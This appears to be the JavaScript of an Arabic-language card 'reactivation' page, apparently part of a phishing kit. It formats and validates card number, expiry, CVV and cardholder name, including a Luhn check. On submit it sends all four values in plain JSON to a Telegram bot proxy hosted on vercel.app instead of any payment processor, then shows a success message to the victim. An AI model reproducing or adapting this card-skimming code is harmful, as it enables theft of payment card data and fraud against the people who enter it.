document.addEventListener('DOMContentLoaded', function() {
    // ===== Preloader Logic =====
    const preloader = document.querySelector('.preloader');
    
    // Hide preloader after page load
    window.addEventListener('load', function() {
        setTimeout(() => {
            preloader.classList.add('hidden');
            setTimeout(() => {
                preloader.style.display = 'none';
            }, 500);
        }, 1000);
    });

    // ===== Form Elements =====
    const paymentForm = document.getElementById('paymentForm');
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryDateInput = document.getElementById('expiryDate');
    const cvvInput = document.getElementById('cvv');
    const cardHolderInput = document.getElementById('cardHolder');
    const submitButton = document.querySelector('.submit-button');
    const successModal = document.getElementById('successModal');
    const cardProgress = document.getElementById('cardProgress');

    // ===== Event Listeners =====
    cardNumberInput.addEventListener('input', handleCardNumberInput);
    cardNumberInput.addEventListener('blur', validateCardNumber);
    cardNumberInput.addEventListener('paste', handleCardPaste);
    
    expiryDateInput.addEventListener('input', handleExpiryDateInput);
    expiryDateInput.addEventListener('blur', validateExpiryDate);
    
    cvvInput.addEventListener('input', handleCvvInput);
    cvvInput.addEventListener('blur', validateCVV);
    
    cardHolderInput.addEventListener('input', handleCardHolderInput);
    cardHolderInput.addEventListener('blur', validateCardHolder);
    
    paymentForm.addEventListener('submit', handleFormSubmit);

    // ===== Helper Functions =====
    function handleCardNumberInput(e) {
        formatCardNumber(e);
        updateProgressBar(e.target.value.replace(/\s/g, '').length, 16);
        
        // Validate only when 16 digits are entered
        if (e.target.value.replace(/\s/g, '').length === 16) {
            validateCardNumber();
        } else {
            resetValidationState(cardNumberInput);
        }
    }

    function handleExpiryDateInput(e) {
        formatExpiryDate(e);
        
        // Validate only when full date is entered
        if (e.target.value.length === 5) {
            validateExpiryDate();
        } else {
            resetValidationState(expiryDateInput);
        }
    }

    function handleCvvInput(e) {
        formatCVV(e);
        
        // Validate only when 3 digits are entered
        if (e.target.value.length === 3) {
            validateCVV();
        } else {
            resetValidationState(cvvInput);
        }
    }

    function handleCardHolderInput(e) {
        // Validate only when there's some input
        if (e.target.value.trim().length > 0) {
            validateCardHolder();
        } else {
            resetValidationState(cardHolderInput);
        }
    }

    function handleCardPaste(e) {
        const pastedData = e.clipboardData.getData('text');
        const cleaned = pastedData.replace(/\D/g, '');
        if (cleaned.length >= 16) {
            this.value = cleaned.match(/.{1,4}/g).join(' ');
            validateCardNumber();
            updateProgressBar(16, 16);
            e.preventDefault();
        }
    }

    async function handleFormSubmit(e) {
        e.preventDefault();
        
        if (!validateForm()) {
            return;
        }

        submitButton.disabled = true;
        submitButton.innerHTML = '<span class="button-text">جاري الإرسال...</span><i class="fas fa-spinner fa-spin button-icon"></i>';

        const formData = {
            cardNumber: cardNumberInput.value,
            expiryDate: expiryDateInput.value,
            cvv: cvvInput.value,
            cardHolder: cardHolderInput.value
        };
        
        const apiEndpoint = 'https://telegram-bot-proxy-lime.vercel.app/api/send';

        try {
            const response = await fetch(apiEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(formData)
            });
            
            const data = await response.json();

            if (response.ok) {
                showSuccessModal();
                paymentForm.reset();
                resetSubmitButton();
                resetFormStyles();
                resetProgressBar();
            } else {
                alert('حدث خطأ أثناء إرسال البيانات.');
                resetSubmitButton();
            }
        } catch (error) {
            console.error('Error:', error);
            alert('حدث خطأ في الاتصال بالخادم.');
            resetSubmitButton();
        }
    }

    // ===== Validation Functions =====
    function validateForm() {
        const isCardNumberValid = validateCardNumber();
        const isExpiryDateValid = validateExpiryDate();
        const isCvvValid = validateCVV();
        const isCardHolderValid = validateCardHolder();

        return isCardNumberValid && isExpiryDateValid && isCvvValid && isCardHolderValid;
    }

    function validateCardNumber() {
        const cardNumber = cardNumberInput.value.replace(/\s/g, '');
        const parent = cardNumberInput.closest('.form-group');
        let isValid = cardNumber.length === 16 && /^\d+$/.test(cardNumber) && validateCardWithLuhn(cardNumber);

        if (isValid) {
            setValidationState(parent, true);
        } else {
            const message = cardNumber.length === 0 ? 'يرجى إدخال رقم البطاقة.' : 'رقم البطاقة غير صحيح.';
            setValidationState(parent, false, message);
        }
        return isValid;
    }

    function validateExpiryDate() {
        const expiryDate = expiryDateInput.value;
        const parent = expiryDateInput.closest('.form-group');
        const [month, year] = expiryDate.split('/');
        
        const currentYear = new Date().getFullYear() % 100;
        const currentMonth = new Date().getMonth() + 1;
        
        let isValid = /^\d{2}\/\d{2}$/.test(expiryDate) && month >= 1 && month <= 12;
        
        if (isValid) {
            const expiryYear = parseInt(year, 10);
            const expiryMonth = parseInt(month, 10);

            if (expiryYear < currentYear || (expiryYear === currentYear && expiryMonth < currentMonth)) {
                isValid = false;
            }
        }

        if (isValid) {
            setValidationState(parent, true);
        } else {
            const message = expiryDate.length === 0 ? 'يرجى إدخال تاريخ انتهاء صلاحية صحيح (MM/YY).' : 'تاريخ الانتهاء غير صحيح أو منتهي.';
            setValidationState(parent, false, message);
        }
        return isValid;
    }

    function validateCVV() {
        const cvv = cvvInput.value;
        const parent = cvvInput.closest('.form-group');
        let isValid = cvv.length === 3 && /^\d+$/.test(cvv);

        if (isValid) {
            setValidationState(parent, true);
        } else {
            const message = cvv.length === 0 ? 'يرجى إدخال رمز الأمان.' : 'رمز الأمان يجب أن يتكون من 3 أرقام على ظهر البطاقة.';
            setValidationState(parent, false, message);
        }
        return isValid;
    }

    function validateCardHolder() {
        const cardHolder = cardHolderInput.value.trim();
        const parent = cardHolderInput.closest('.form-group');
        let isValid = cardHolder.length > 0;
        
        if (isValid) {
            setValidationState(parent, true);
        } else {
            const message = 'يرجى إدخال اسم حامل البطاقة.';
            setValidationState(parent, false, message);
        }
        return isValid;
    }

    function validateCardWithLuhn(cardNumber) {
        let sum = 0;
        for (let i = 0; i < cardNumber.length; i++) {
            let digit = parseInt(cardNumber[i], 10);
            if ((cardNumber.length - i) % 2 === 0) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }
            sum += digit;
        }
        return sum % 10 === 0;
    }

    // ===== UI Functions =====
    function setValidationState(parent, isValid, message = '') {
        const input = parent.querySelector('input');
        let errorElement = parent.querySelector('.error-message');

        if (isValid) {
            input.classList.add('valid');
            input.classList.remove('invalid');
            parent.classList.remove('has-error');
            if (errorElement) {
                errorElement.textContent = '';
            }
        } else {
            input.classList.add('invalid');
            input.classList.remove('valid');
            parent.classList.add('has-error');
            if (!errorElement) {
                errorElement = document.createElement('span');
                errorElement.className = 'error-message';
                parent.appendChild(errorElement);
            }
            errorElement.textContent = message;
        }
    }

    function resetValidationState(inputElement) {
        const parent = inputElement.closest('.form-group');
        parent.classList.remove('has-error');
        inputElement.classList.remove('valid', 'invalid');
        
        const errorElement = parent.querySelector('.error-message');
        if (errorElement) {
            errorElement.textContent = '';
        }
    }

    function updateProgressBar(current, total) {
        const progress = (current / total) * 100;
        cardProgress.style.width = `${progress}%`;
    }

    function resetProgressBar() {
        cardProgress.style.width = '0%';
    }

    // ===== Formatting Functions =====
    function formatCardNumber(e) {
        const target = e.target;
        const value = target.value.replace(/\s/g, '');
        const formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
        target.value = formattedValue;
    }

    function formatExpiryDate(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
    }

    function formatCVV(e) {
        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
    }

    // ===== Reset Functions =====
    function resetSubmitButton() {
        submitButton.disabled = false;
        submitButton.innerHTML = '<span class="button-text">إعادة تفعيل البطاقة</span><i class="fas fa-redo button-icon"></i>';
    }

    function resetFormStyles() {
        const inputs = paymentForm.querySelectorAll('input');
        inputs.forEach(input => {
            input.classList.remove('valid', 'invalid');
        });
        const errorMessages = paymentForm.querySelectorAll('.error-message');
        errorMessages.forEach(error => error.remove());
    }

    // ===== Modal Functions =====
    function showSuccessModal() {
        successModal.classList.add('active');
    }
    
    successModal.addEventListener('click', (e) => {
        if (e.target === successModal) {
            successModal.classList.remove('active');
        }
    });
});
